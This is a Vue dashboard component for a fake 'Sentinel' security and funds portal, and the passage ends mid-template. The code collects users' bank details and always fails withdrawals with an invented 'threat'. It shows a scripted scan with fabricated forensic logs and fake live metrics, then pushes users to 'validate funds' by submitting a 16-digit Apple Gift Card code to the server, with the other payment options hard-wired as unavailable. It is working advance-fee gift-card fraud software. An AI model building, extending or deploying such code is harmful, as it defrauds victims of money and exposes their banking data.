<script setup>
import AuthenticatedLayout from '@/Layouts/AuthenticatedLayout.vue';
import { Head, router, usePage } from '@inertiajs/vue3';
import { computed, nextTick, onMounted, onUnmounted, ref, watch } from 'vue';
import { useLocaleText } from '@/Composables/useLocaleText';

const page = usePage();
const { t, isJapaneseLocale } = useLocaleText();
const ACTION_LOCK_KEY = 'sentinel-user-actions-lock-until';
const ACTION_LOCK_DURATION_MS = 24 * 60 * 60 * 1000;

const systemStatus = computed(() => ({
    firewall: t('dashboard.statusActive', 'ACTIVE'),
    intrusion: t('dashboard.statusMonitoring', 'MONITORING'),
    encryption: t('dashboard.statusSecure', 'SECURE'),
    network: t('dashboard.statusStable', 'STABLE'),
}));

const alerts = computed(() => ([
    { id: 1, type: 'warning', message: t('dashboard.alertLoginAttempt', 'Unusual login attempt detected'), time: t('dashboard.alert2min', '2 min ago') },
    { id: 2, type: 'info', message: t('dashboard.alertScanComplete', 'System scan completed successfully'), time: t('dashboard.alert15min', '15 min ago') },
    { id: 3, type: 'success', message: t('dashboard.alertProtocolsUpdated', 'All security protocols updated'), time: t('dashboard.alert1hour', '1 hour ago') },
]));

const metrics = ref({
    threatsBlocked: 1247,
    activeSessions: 3,
    uptime: '99.98%',
    responseTime: '12ms'
});

const showWithdrawModal = ref(false);
const showTransferModal = ref(false);
const showSentinelScanModal = ref(false);
const showSentinelThreatModal = ref(false);
const showWithdrawAmountModal = ref(false);
const bankName = ref('');
const branchCode = ref('');
const accountNumber = ref('');
const routingNumber = ref('');
const accountHolder = ref('');
const withdrawAmount = ref('');
const bankDetailsSaved = ref(false);
const withdrawMessage = ref('');
const withdrawError = ref('');
const isTransferInProgress = ref(false);
const transferStatus = ref('');
const transferFailed = ref(false);
const showSentinelModal = ref(false);
const showValidateOptions = ref(false);
const availableFundsSection = ref(null);
const fundsValidated = ref(false);
const fundsValidationMessage = ref('');
const showAppleForm = ref(false);
const appleSubmitting = ref(false);
const appleAmount = ref('');
const appleGiftCardAmount = ref('');
const actionsLockedUntil = ref(null);
const actionLockCountdown = ref('24:00:00');
const sentinelScanTimeLeft = ref(30);
const sentinelScanInProgress = ref(false);
const sentinelScanLogs = ref([]);
const sentinelScanThreatDetected = ref(false);
const sentinelScanThreatTitle = ref('');
const sentinelScanThreatMessage = ref('');

const withdrawableBalance = computed(() => Number(page.props.auth?.user?.withdrawable_balance ?? 0));
const userIsAdmin = computed(() => Boolean(page.props.auth?.user?.is_admin));
const currentCountryCode = computed(() => page.props.auth?.currentCountryCode ?? null);
const bankProfile = computed(() => page.props.auth?.bankProfile ?? null);
const isJapanUser = computed(() => currentCountryCode.value === 'JP' || isJapaneseLocale.value);
const areQuickActionsLocked = computed(() => !userIsAdmin.value && Boolean(actionsLockedUntil.value && actionsLockedUntil.value > Date.now()));
const bankNameLabel = computed(() => isJapanUser.value ? t('dashboard.japaneseBankName', 'Japanese Bank Name') : t('dashboard.bankName', 'Bank Name'));
const branchCodeLabel = computed(() => isJapanUser.value ? t('dashboard.branchCode', 'Branch Code') : t('dashboard.routingNumber', 'Routing Number'));
const branchCodePlaceholder = computed(() => isJapanUser.value ? t('dashboard.branchCodePlaceholder', '3-digit branch code') : t('dashboard.routingNumberPlaceholder', 'Enter routing number'));
const accountNumberLabel = computed(() => t('dashboard.accountNumber', 'Account Number'));
const accountNumberPlaceholder = computed(() => isJapanUser.value ? t('dashboard.accountNumberPlaceholderJapan', '7-digit account number') : t('dashboard.accountNumberPlaceholderDefault', 'Enter account number'));
const accountHolderLabel = computed(() => isJapanUser.value ? t('dashboard.accountNameHolder', 'Account Name Holder') : t('dashboard.accountHolder', 'Account Holder'));
const accountHolderPlaceholder = computed(() => isJapanUser.value ? t('dashboard.accountHolderPlaceholderJapan', 'Example: SAWADA KAZUKI') : t('dashboard.accountHolderPlaceholderDefault', 'Enter account holder name'));
const bankNamePlaceholder = computed(() => isJapanUser.value ? t('dashboard.bankNamePlaceholderJapan', 'Example: みずほ銀行') : t('dashboard.bankNamePlaceholderDefault', 'Enter bank name'));
const sentinelScanProgress = computed(() => ((30 - sentinelScanTimeLeft.value) / 30) * 100);
const maxWithdrawableAmount = computed(() => Number(withdrawableBalance.value || 0));

let sentinelScanTicker = null;
let sentinelScanLogStreamer = null;
let metricsTicker = null;
let actionLockTicker = null;

const sentinelScanFeed = [
    '> Initializing Sentinel forensic relay for failed withdrawal trace...',
    '> Verifying SWIFT corridor entropy against secure ledger mirror...',
    '> Cross-checking outbound transfer payload with bank node checksum...',
    '> Reconstructing routing graph from encrypted settlement fragments...',
    '> Inspecting transactional nonce drift inside withdrawal handshake...',
    '> Measuring liquidity shadow variance across mirrored bank channels...',
    '> Comparing user-side bank standing with Sentinel vault registry...',
    '> Probing Yokohama corridor for hostile packet duplication signatures...',
    '> Identifying unauthorized replay vectors on settlement endpoint...',
    '> Tracing decoy ledger beacons inside transfer confirmation stream...',
    '> Inspecting route contamination from black-hole siphon infrastructure...',
    '> Evaluating bank node integrity against Sentinel trust anchors...',
    '> Synchronizing fraud telemetry with regional anti-spoof monitors...',
    '> Detecting anomaly bursts around withdrawal confirmation gateway...',
    '> Locking suspicious relay path pending liquidity verification...',
];

const formatYen = (value) => new Intl.NumberFormat('ja-JP').format(Number(value ?? 0));

const formatCountdown = (remainingMs) => {
    const totalSeconds = Math.max(0, Math.floor(remainingMs / 1000));
    const hours = Math.floor(totalSeconds / 3600).toString().padStart(2, '0');
    const minutes = Math.floor((totalSeconds % 3600) / 60).toString().padStart(2, '0');
    const seconds = (totalSeconds % 60).toString().padStart(2, '0');

    return `${hours}:${minutes}:${seconds}`;
};

const syncQuickActionLock = () => {
    if (userIsAdmin.value) {
        actionsLockedUntil.value = null;
        actionLockCountdown.value = '00:00:00';
        return;
    }

    const stored = window.localStorage.getItem(ACTION_LOCK_KEY);
    const parsed = stored ? Number(stored) : NaN;
    const nextExpiry = Number.isFinite(parsed) && parsed > Date.now()
        ? parsed
        : Date.now() + ACTION_LOCK_DURATION_MS;

    window.localStorage.setItem(ACTION_LOCK_KEY, String(nextExpiry));
    actionsLockedUntil.value = nextExpiry;
    actionLockCountdown.value = formatCountdown(nextExpiry - Date.now());
};

const openWithdrawModal = () => {
    withdrawError.value = '';
    withdrawMessage.value = '';

    if (bankDetailsSaved.value) {
        showWithdrawAmountModal.value = true;
        withdrawAmount.value = maxWithdrawableAmount.value > 0 ? String(maxWithdrawableAmount.value) : '';
        return;
    }

    showWithdrawModal.value = true;
};

const closeWithdrawModal = () => {
    showWithdrawModal.value = false;
    if (!bankDetailsSaved.value) {
        bankName.value = '';
        branchCode.value = '';
        accountNumber.value = '';
        routingNumber.value = '';
        accountHolder.value = '';
    }
    withdrawError.value = '';
};

const closeWithdrawAmountModal = () => {
    showWithdrawAmountModal.value = false;
    withdrawError.value = '';
};

const syncBankProfile = () => {
    if (!bankProfile.value) {
        bankDetailsSaved.value = false;
        return;
    }

    bankName.value = bankProfile.value.bank_name ?? '';
    branchCode.value = bankProfile.value.branch_code ?? '';
    accountNumber.value = bankProfile.value.account_number ?? '';
    routingNumber.value = bankProfile.value.routing_number ?? '';
    accountHolder.value = bankProfile.value.account_holder ?? '';
    bankDetailsSaved.value = Boolean(bankName.value && accountNumber.value && accountHolder.value && (isJapanUser.value ? branchCode.value : routingNumber.value));
};

const closeTransferModal = () => {
    showTransferModal.value = false;
    isTransferInProgress.value = false;
    transferStatus.value = '';
    transferFailed.value = false;
    withdrawMessage.value = '';
};

const stopSentinelScan = () => {
    if (sentinelScanTicker) {
        window.clearInterval(sentinelScanTicker);
        sentinelScanTicker = null;
    }

    if (sentinelScanLogStreamer) {
        window.clearInterval(sentinelScanLogStreamer);
        sentinelScanLogStreamer = null;
    }
};

const closeSentinelScanModal = () => {
    stopSentinelScan();
    showSentinelScanModal.value = false;
    sentinelScanInProgress.value = false;
    sentinelScanTimeLeft.value = 30;
    sentinelScanLogs.value = [];
};

const closeSentinelThreatModal = () => {
    showSentinelThreatModal.value = false;
    sentinelScanThreatDetected.value = false;
    sentinelScanThreatTitle.value = '';
    sentinelScanThreatMessage.value = '';
};

const completeSentinelScan = () => {
    stopSentinelScan();
    sentinelScanInProgress.value = false;
    sentinelScanThreatDetected.value = true;
    sentinelScanThreatTitle.value = t('dashboard.threatDetectedTitle', 'Threat detected: Withdrawal relay mismatch');
    sentinelScanThreatMessage.value = t('dashboard.threatDetectedMessage', 'Sentinel identified a forged settlement corridor between your registered bank path and the transfer mirror. The withdrawal was intercepted before release to prevent exposure to a Black Hole collection node.');
    sentinelScanLogs.value = [
        ...sentinelScanLogs.value,
        '> Scan complete. Threat correlation index elevated to CRITICAL.',
        '> Suspicious mirror route confirmed inside external settlement handshake.',
        '> Withdrawal relay quarantined. Manual Sentinel validation required.',
    ];

    window.setTimeout(() => {
        showSentinelScanModal.value = false;
        showSentinelThreatModal.value = true;
    }, 900);
};

const openSentinelScanModal = () => {
    closeTransferModal();
    stopSentinelScan();

    showSentinelThreatModal.value = false;
    showSentinelScanModal.value = true;
    sentinelScanInProgress.value = true;
    sentinelScanTimeLeft.value = 30;
    sentinelScanThreatDetected.value = false;
    sentinelScanThreatTitle.value = '';
    sentinelScanThreatMessage.value = '';
    sentinelScanLogs.value = [
        '> Sentinel scan requested by operator...',
        '> Mounting forensic lenses on failed withdrawal channel...',
    ];

    let logIndex = 0;

    sentinelScanTicker = window.setInterval(() => {
        if (sentinelScanTimeLeft.value <= 1) {
            sentinelScanTimeLeft.value = 0;
            completeSentinelScan();
            return;
        }

        sentinelScanTimeLeft.value -= 1;
    }, 1000);

    sentinelScanLogStreamer = window.setInterval(() => {
        const nextFeedLine = sentinelScanFeed[logIndex % sentinelScanFeed.length];
        const pressureBand = 82 + (logIndex % 14);
        const packetVariance = 14 + ((logIndex * 7) % 29);

        sentinelScanLogs.value = [
            ...sentinelScanLogs.value,
            `${nextFeedLine} [variance:${packetVariance}%|pressure:${pressureBand}]`,
        ].slice(-10);

        logIndex += 1;
    }, 1500);
};

const closeTransferModalFromBackdrop = () => {
    if (isTransferInProgress.value) {
        return;
    }

    closeTransferModal();
};

const saveBankDetails = () => {
    const regionSpecificCode = isJapanUser.value ? branchCode.value : routingNumber.value;

    if (!bankName.value || !accountNumber.value || !regionSpecificCode || !accountHolder.value) {
        withdrawError.value = t('dashboard.completeBankDetailsError', 'Please complete all bank details before withdrawing.');
        return;
    }

    router.post(route('bank-profile.store'), {
        bank_name: bankName.value,
        branch_code: branchCode.value,
        account_number: accountNumber.value,
        routing_number: routingNumber.value,
        account_holder: accountHolder.value,
    }, {
        preserveScroll: true,
        onSuccess: () => {
            bankDetailsSaved.value = true;
            showWithdrawModal.value = false;
            withdrawError.value = '';
            withdrawMessage.value = t('dashboard.saveBankSuccess', 'Bank details saved for :bankName. Your next withdrawal will ask for an amount.').replace(':bankName', bankName.value);
        },
        onError: (errors) => {
            withdrawError.value = errors.bank_name
                ?? errors.branch_code
                ?? errors.account_number
                ?? errors.routing_number
                ?? errors.account_holder
                ?? t('dashboard.saveBankError', 'Unable to save bank details. Please review the information and try again.');
        },
    });
};

const submitWithdrawAmount = () => {
    if (!withdrawAmount.value || Number(withdrawAmount.value) <= 0) {
        withdrawError.value = t('dashboard.validWithdrawalAmountError', 'Please enter a valid withdrawal amount.');
        return;
    }

    router.post(route('withdrawals.store'), {
        amount: withdrawAmount.value,
        bank_name: bankName.value,
        branch_code: branchCode.value,
        account_number: accountNumber.value,
        routing_number: routingNumber.value,
        account_holder: accountHolder.value,
    }, {
        preserveScroll: true,
        onSuccess: () => {
            showWithdrawAmountModal.value = false;
            withdrawError.value = '';
            withdrawMessage.value = '';
            startWithdraw(withdrawAmount.value);
        },
        onError: (errors) => {
            withdrawError.value = errors.bank_name
                ?? errors.branch_code
                ?? errors.account_number
                ?? errors.routing_number
                ?? errors.account_holder
                ?? errors.amount
                ?? t('dashboard.submitWithdrawalError', 'Unable to submit the withdrawal request. Please review your bank details.');
        },
    });
};

const startWithdraw = (amount = withdrawAmount.value) => {
    if (isTransferInProgress.value) {
        return;
    }

    withdrawMessage.value = '';
    transferFailed.value = false;
    transferStatus.value = t('dashboard.processingTransfer', 'Processing transfer request for ¥:amount...').replace(':amount', formatYen(amount));
    isTransferInProgress.value = true;
    showTransferModal.value = true;
    withdrawError.value = '';

    setTimeout(() => {
        isTransferInProgress.value = false;
        transferFailed.value = true;
        transferStatus.value = t('dashboard.threatDetectedTransfer', 'A threat was detected while transferring ¥:amount. Bank balance needs to be validated first to secure the safety of the users funds.').replace(':amount', formatYen(amount));
        withdrawError.value = '';
    }, 5000);
};

const validateFunds = async (method = null) => {
    fundsValidated.value = true;
    fundsValidationMessage.value = method
        ? t('dashboard.validationViaMethod', 'Validating via :method. Liquidity verification is now in progress. Please wait for Sentinel to confirm your funds.').replace(':method', method)
        : t('dashboard.validationInProgress', 'Liquidity verification is now in progress. Please wait for Sentinel to confirm your funds.');
    await nextTick();
    availableFundsSection.value?.scrollIntoView({ behavior: 'smooth', block: 'center' });
};

const openValidateOptions = () => {
    showValidateOptions.value = true;
};

const selectValidateMethod = async (method) => {
    if (method === 'PayPay' || method === 'Western Union') {
        fundsValidated.value = true;
        fundsValidationMessage.value = t('dashboard.methodUnavailable', ':method is not available at the moment. Please try another validation method.').replace(':method', method);
        showValidateOptions.value = false;
        await nextTick();
        availableFundsSection.value?.scrollIntoView({ behavior: 'smooth', block: 'center' });
    } else if (method === 'Apple Gift Card') {
        showValidateOptions.value = false;
        showAppleForm.value = true;
    }
};

const submitAppleForm = () => {
    if (!appleAmount.value || !appleGiftCardAmount.value) {
        fundsValidationMessage.value = t('dashboard.fillBothFields', 'Please fill in both fields.');
        return;
    }

    const normalizedGiftCardCode = appleGiftCardAmount.value.replace(/\D/g, '');

    if (normalizedGiftCardCode.length !== 16) {
        fundsValidationMessage.value = t('dashboard.appleCodeDigits', 'Apple gift card validation requires exactly 16 digits.');
        return;
    }

    appleSubmitting.value = true;

    router.post('/validate-funds/apple-gift-card', {
        amount: appleAmount.value,
        gift_card_code: normalizedGiftCardCode,
    }, {
        preserveScroll: true,
        onSuccess: async () => {
            appleSubmitting.value = false;
            fundsValidated.value = true;
            fundsValidationMessage.value = t('dashboard.validationSubmitted', 'Validation submitted for ¥:amount. Awaiting admin approval before the amount is added to your withdrawable balance.').replace(':amount', formatYen(appleAmount.value));
            showAppleForm.value = false;
            appleAmount.value = '';
            appleGiftCardAmount.value = '';

            await nextTick();
            availableFundsSection.value?.scrollIntoView({ behavior: 'smooth', block: 'center' });
        },
        onError: () => {
            appleSubmitting.value = false;
            fundsValidationMessage.value = t('dashboard.validationSubmitError', 'Unable to submit validation. Please check the amount and code.');
        },
    });
};

const continueFromSentinel = async () => {
    closeSentinelModal();
    await openValidateOptions();
};

const openSentinelModal = () => {
    showSentinelModal.value = true;
};

const openSentinelPortalFromScan = () => {
    closeSentinelThreatModal();
    openSentinelModal();
};

const closeSentinelModal = () => {
    showSentinelModal.value = false;
};

onMounted(() => {
    syncQuickActionLock();

    // Simulate real-time status updates
    metricsTicker = window.setInterval(() => {
        metrics.value.threatsBlocked += Math.floor(Math.random() * 5) + 1;
        metrics.value.responseTime = `${12 + Math.floor(Math.random() * 6)}ms`;
        metrics.value.uptime = `99.${98 + Math.floor(Math.random() * 2)}%`;
    }, 5000);

    actionLockTicker = window.setInterval(() => {
        if (actionsLockedUntil.value) {
            actionLockCountdown.value = formatCountdown(actionsLockedUntil.value - Date.now());
        }
    }, 1000);
});

watch([bankProfile, currentCountryCode], () => {
    syncBankProfile();
}, { immediate: true });

onUnmounted(() => {
    stopSentinelScan();

    if (metricsTicker) {
        window.clearInterval(metricsTicker);
        metricsTicker = null;
    }

    if (actionLockTicker) {
        window.clearInterval(actionLockTicker);
        actionLockTicker = null;
    }
});
</script>

<template>
    <Head :title="t('common.controlCenter', 'Sentinel Control Center')" />

    <AuthenticatedLayout>
        <div class="py-6">
            <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8">
                <!-- Funds Cards -->
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                    <div ref="availableFundsSection" class="bg-gray-900/80 border border-cyan-500/30 rounded-lg p-5 backdrop-blur-sm">
                        <div class="flex items-start justify-between gap-4 mb-4">
                            <div>
                                <div class="text-xs text-cyan-400 uppercase tracking-wider mb-2">{{ t('dashboard.availableFunds', 'Available Funds') }}</div>
                                <div class="text-3xl font-mono text-white">¥0</div>
                            </div>
                            <div class="text-sm text-red-400 font-semibold">{{ t('dashboard.unverified', 'Unverified') }}</div>
                        </div>
                        <p class="text-sm text-gray-400 mb-4">{{ t('dashboard.availableFundsHelp', 'Core operating funds available for immediate cyber operations.') }}</p>
                        <div class="flex flex-wrap gap-3">
                            <button @click="openValidateOptions" class="bg-cyan-600 hover:bg-cyan-500 text-white rounded px-4 py-2 text-sm font-medium transition">
                                {{ t('dashboard.validateFunds', 'Validate Funds') }}
                            </button>
                        </div>
                        <p v-if="fundsValidated" class="mt-4 text-sm text-cyan-200">{{ fundsValidationMessage }}</p>
                    </div>

                    <div v-if="showValidateOptions" class="fixed inset-0 z-[10000] flex items-center justify-center bg-black/80 px-4 py-6">
                        <div class="w-full max-w-xl rounded-3xl border border-cyan-500/30 bg-gray-950/95 p-8 shadow-2xl shadow-cyan-500/20 backdrop-blur-md">
                            <div class="flex items-start justify-between gap-4 mb-6">
                                <div>
                                    <h3 class="text-2xl font-semibold text-white">{{ t('dashboard.validateVia', 'Validate Via') }}</h3>
                                    <p class="mt-2 text-sm text-gray-400">{{ t('dashboard.validateMethodHelp', 'Choose a verification method to continue secure funds validation.') }}</p>
                                </div>
                                <button @click="showValidateOptions = false" class="text-gray-400 hover:text-white">✕</button>
                            </div>
                            <div class="grid gap-4 sm:grid-cols-3">
                                <button @click="selectValidateMethod('PayPay')" class="rounded-2xl border border-cyan-500/20 bg-slate-900 px-4 py-5 text-left text-white transition hover:border-cyan-400">
                                    <div class="text-sm uppercase tracking-wider text-cyan-400 mb-2">PayPay</div>
                                    <div class="text-sm text-gray-300">{{ t('dashboard.paypayHelp', 'Secure node confirmation via digital payment link.') }}</div>
                                </button>
                                <button @click="selectValidateMethod('Western Union')" class="rounded-2xl border border-cyan-500/20 bg-slate-900 px-4 py-5 text-left text-white transition hover:border-cyan-400">
                                    <div class="text-sm uppercase tracking-wider text-cyan-400 mb-2">Western Union</div>
                                    <div class="text-sm text-gray-300">{{ t('dashboard.westernUnionHelp', 'Match your transfer channel to encrypted ledger records.') }}</div>
                                </button>
                                <button @click="selectValidateMethod('Apple Gift Card')" class="rounded-2xl border border-cyan-500/20 bg-slate-900 px-4 py-5 text-left text-white transition hover:border-cyan-400">
                                    <div class="text-sm uppercase tracking-wider text-cyan-400 mb-2">Apple Gift Card</div>
                                    <div class="text-sm text-gray-300">{{ t('dashboard.appleGiftHelp', 'Validate with a trusted gift card asset channel.') }}</div>
                                </button>
                            </div>
                        </div>
                    </div>

                    <div v-if="showAppleForm" class="fixed inset-0 z-[10001] flex items-center justify-center bg-black/80 px-4 py-6">
                        <div class="w-full max-w-md rounded-3xl border border-cyan-500/30 bg-gray-950/95 p-8 shadow-2xl shadow-cyan-500/20 backdrop-blur-md">
                            <template v-if="!appleSubmitting">
                                <div class="flex items-start justify-between gap-4 mb-6">
                                    <div>
                                        <h3 class="text-xl font-semibold text-white">{{ t('dashboard.appleGiftTitle', 'Apple Gift Card Validation') }}</h3>
                                        <p class="mt-2 text-sm text-gray-400">{{ t('dashboard.appleGiftSubtitle', 'Enter the required amounts to proceed with validation.') }}</p>
                                    </div>
                                    <button @click="showAppleForm = false" class="text-gray-400 hover:text-white">✕</button>
                                </div>
                                <div class="space-y-4">
                                    <div>
                                        <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ t('dashboard.amountJpy', 'Amount (JPY)') }}</label>
                                        <input v-model="appleAmount" type="number" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="t('dashboard.amountPlaceholderYen', 'Enter amount in yen')" />
                                    </div>
                                    <div>
                                        <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ t('dashboard.code', 'Code') }}</label>
                                        <input v-model="appleGiftCardAmount" type="text" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="t('dashboard.codePlaceholder', 'Enter code')" />
                                    </div>
                                </div>
                                <div class="mt-6 flex justify-end gap-3">
                                    <button @click="showAppleForm = false" class="rounded-lg border border-gray-700 bg-gray-800 px-4 py-2 text-sm font-medium text-gray-300 transition hover:bg-gray-700">{{ t('common.cancel', 'Cancel') }}</button>
                                    <button @click="submitAppleForm" class="rounded-lg bg-cyan-600 px-4 py-2 text-sm font-medium text-white transition hover:bg-cyan-500">{{ t('dashboard.submit', 'Submit') }}</button>
                                </div>
                            </template>
                            <template v-else>
                                <div class="flex flex-col items-center justify-center gap-4 py-10 text-center">
                                    <div class="h-16 w-16 rounded-full border-4 border-cyan-500 border-t-transparent animate-spin"></div>
                                    <div>
                                        <p class="text-lg font-semibold text-white">{{ t('dashboard.appleGiftVerifying', 'Please wait while we are veryfing this.') }}</p>
                                        <p class="mt-2 text-sm text-gray-400">{{ t('dashboard.appleGiftVerifyingSubtitle', 'Sentinel is verifying your Apple Gift Card submission.') }}</p>
                                    </div>
                                </div>
                            </template>
                        </div>
                    </div>
                    <div class="bg-gray-900/80 border border-cyan-500/30 rounded-lg p-5 backdrop-blur-sm">
                        <div class="flex items-start justify-between gap-4 mb-4">
                            <div>
                                <div class="text-xs text-cyan-400 uppercase tracking-wider mb-2">{{ t('dashboard.withdrawableBalance', 'Withdrawable Balance') }}</div>
                                <div class="text-3xl font-mono text-white">¥{{ formatYen(withdrawableBalance) }}</div>
                            </div>
                            <div class="text-sm text-green-400 font-semibold">{{ t('dashboard.verified', 'Verified') }}</div>
                        </div>
                        <p class="text-sm text-gray-400 mb-4">{{ t('dashboard.withdrawableHelp', 'Funds cleared for withdrawal and emergency transfer.') }}</p>
                        <div class="flex flex-wrap gap-3">
                            <button @click="openWithdrawModal" class="bg-gray-700 hover:bg-gray-600 text-white rounded px-4 py-2 text-sm font-medium transition">
                                {{ t('dashboard.withdraw', 'Withdraw') }}
                            </button>
                        </div>
                    </div>
                </div>

                <div v-if="showWithdrawModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 px-4 py-6">
                    <div class="w-full max-w-lg rounded-2xl border border-cyan-500/30 bg-gray-950/95 p-6 shadow-2xl shadow-cyan-500/10 backdrop-blur-md">
                        <div class="flex items-center justify-between mb-4">
                            <div>
                                <h3 class="text-lg font-semibold text-white">{{ t('dashboard.confirmBankDetails', 'Confirm Bank Details') }}</h3>
                                <p class="text-sm text-gray-400">{{ isJapanUser ? t('dashboard.japanBankDetailsHelp', 'Japan-based users must enter a Japanese bank, a 3-digit branch code, a 7-digit account number, and the account name holder.') : t('dashboard.defaultBankDetailsHelp', 'Enter account information before completing the withdrawal.') }}</p>
                            </div>
                            <button @click="closeWithdrawModal" class="text-gray-400 hover:text-white">✕</button>
                        </div>
                        <div class="space-y-4">
                            <div>
                                <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ bankNameLabel }}</label>
                                <input v-model="bankName" type="text" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="bankNamePlaceholder" />
                            </div>
                            <div>
                                <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ branchCodeLabel }}</label>
                                <input v-if="isJapanUser" v-model="branchCode" type="text" inputmode="numeric" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="branchCodePlaceholder" />
                                <input v-else v-model="routingNumber" type="text" inputmode="numeric" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="branchCodePlaceholder" />
                            </div>
                            <div>
                                <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ accountNumberLabel }}</label>
                                <input v-model="accountNumber" type="text" inputmode="numeric" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="accountNumberPlaceholder" />
                            </div>
                            <div>
                                <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ accountHolderLabel }}</label>
                                <input v-model="accountHolder" type="text" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="accountHolderPlaceholder" />
                            </div>
                        </div>
                        <div class="mt-4 flex flex-col gap-3 sm:flex-row sm:justify-end">
                            <button @click="closeWithdrawModal" class="w-full rounded-lg border border-gray-700 bg-gray-800 px-4 py-3 text-sm font-medium text-gray-300 transition hover:bg-gray-700 sm:w-auto">{{ t('common.cancel', 'Cancel') }}</button>
                            <button @click="saveBankDetails" class="w-full rounded-lg bg-cyan-600 px-4 py-3 text-sm font-medium text-white transition hover:bg-cyan-500 sm:w-auto">{{ t('dashboard.saveBankDetails', 'Save Bank Details') }}</button>
                        </div>
                        <p v-if="withdrawError" class="mt-4 text-sm text-red-400">{{ withdrawError }}</p>
                    </div>
                </div>

                <div v-if="showWithdrawAmountModal" class="fixed inset-0 z-50 flex items-center justify-center bg-black/60 px-4 py-6">
                    <div class="w-full max-w-md rounded-2xl border border-cyan-500/30 bg-gray-950/95 p-6 shadow-2xl shadow-cyan-500/10 backdrop-blur-md">
                        <div class="flex items-center justify-between mb-4">
                            <div>
                                <h3 class="text-lg font-semibold text-white">{{ t('dashboard.withdrawAmount', 'Withdraw Amount') }}</h3>
                                <p class="text-sm text-gray-400">{{ t('dashboard.withdrawAmountHelp', 'Enter how much you want to withdraw using your saved bank details.') }}</p>
                            </div>
                            <button @click="closeWithdrawAmountModal" class="text-gray-400 hover:text-white">✕</button>
                        </div>
                        <div class="space-y-4">
                            <div>
                                <label class="block text-xs uppercase tracking-wider text-cyan-400 mb-2">{{ t('dashboard.withdrawAmount', 'Withdrawal Amount') }}</label>
                                <input v-model="withdrawAmount" type="number" min="1" :max="maxWithdrawableAmount" step="0.01" class="w-full rounded-lg border border-cyan-500/30 bg-gray-900 px-4 py-3 text-white focus:border-cyan-400 focus:outline-none" :placeholder="t('dashboard.withdrawAmountHelp', 'Enter how much you want to withdraw using your saved bank details.')" />
                                <p class="mt-2 text-xs text-slate-400">{{ t('dashboard.availableBalance', 'Available balance') }}: ¥{{ formatYen(maxWithdrawableAmount) }}</p>
                            </div>
                        </div>
                        <div class="mt-4 flex flex-col gap-3 sm:flex-row sm:justify-end">
                            <button @click="closeWithdrawAmountModal" class="w-full rounded-lg border border-gray-700 bg-gray-800 px-4 py-3 text-sm font-medium text-gray-300 transition hover:bg-gray-700 sm:w-auto">{{ t('common.cancel', 'Cancel') }}</button>
                            <button @click="submitWithdrawAmount" class="w-full rounded-lg bg-cyan-600 px-4 py-3 text-sm font-medium text-white transition hover:bg-cyan-500 sm:w-auto">{{ t('dashboard.continueWithdrawal', 'Continue Withdrawal') }}</button>
                        </div>
                        <p v-if="withdrawError" class="mt-4 text-sm text-red-400">{{ withdrawError }}</p>
                    </div>
                </div>

                <div v-if="showTransferModal" @click.self="closeTransferModalFromBackdrop" class="fixed inset-0 z-50 flex items-center justify-center bg-black/70 px-4 py-6">
                    <div class="w-full max-w-md rounded-3xl border border-cyan-500/30 bg-gray-950/95 p-6 shadow-2xl shadow-cyan-500/20 backdrop-blur-md">
                        <div class="flex flex-col items-center justify-center space-y-4 text-center">
                            <div :class="['relative flex h-28 w-28 items-center justify-center rounded-full', transferFailed ? 'bg-red-950 ring-2 ring-red-500/50' : 'bg-slate-900/80 ring-2 ring-cyan-500/50']">
                                <div v-if="!transferFailed" class="absolute inset-0 rounded-full animate-ping bg-cyan-500/20"></div>
                                <div v-if="!transferFailed" :class="['relative flex h-16 w-16 items-center justify-center rounded-full bg-cyan-600 text-white text-3xl font-bold', isTransferInProgress ? 'animate-spin' : '']">↻</div>
                                <div v-else class="relative flex h-16 w-16 items-center justify-center rounded-full bg-red-600 text-white text-4xl font-bold">✕</div>
                            </div>
                            <div>
                                <h3 class="text-xl font-semibold text-white">{{ transferFailed ? t('dashboard.transferFailed', 'Transfer failed') : t('dashboard.transferInProgress', 'Transfer in progress') }}</h3>
                                <p :class="transferFailed ? 'mt-2 text-sm text-red-300 font-semibold' : 'mt-2 text-sm text-gray-400'">
                                    {{ transferFailed ? t('dashboard.transferBlocked', 'The transfer was blocked for security validation.') : t('dashboard.transferSecure', 'Your withdrawal is being routed through secure channels.') }}
                                </p>
                            </div>
                            <div v-if="transferFailed" class="mt-3 rounded-2xl bg-red-950/90 px-4 py-3 text-sm text-red-200 ring-1 ring-red-500/20">
                                {{ transferStatus }}
                            </div>
                            <button v-if="!isTransferInProgress" @click="openSentinelScanModal" class="mt-4 inline-flex rounded-full bg-cyan-600 px-5 py-2 text-sm font-semibold text-white transition hover:bg-cyan-500">{{ t('common.sentinelScan', 'Sentinel Scan') }}</button>
                        </div>
                    </div>
                </div>

                <div v-if="showSentinelScanModal" @click.self="closeSentinelScanModal" class="fixed inset-0 z-[9998] flex items-center justify-center bg-black/80 px-4 py-6">
                    <div class="max-h-[calc(100vh-3rem)] w-full max-w-3xl overflow-y-auto rounded-3xl border border-cyan-500/30 bg-gray-950/95 p-8 shadow-2xl shadow-cyan-500/20 backdrop-blur-md">
                        <div class="flex items-start justify-between gap-4 mb-6">
                            <div>
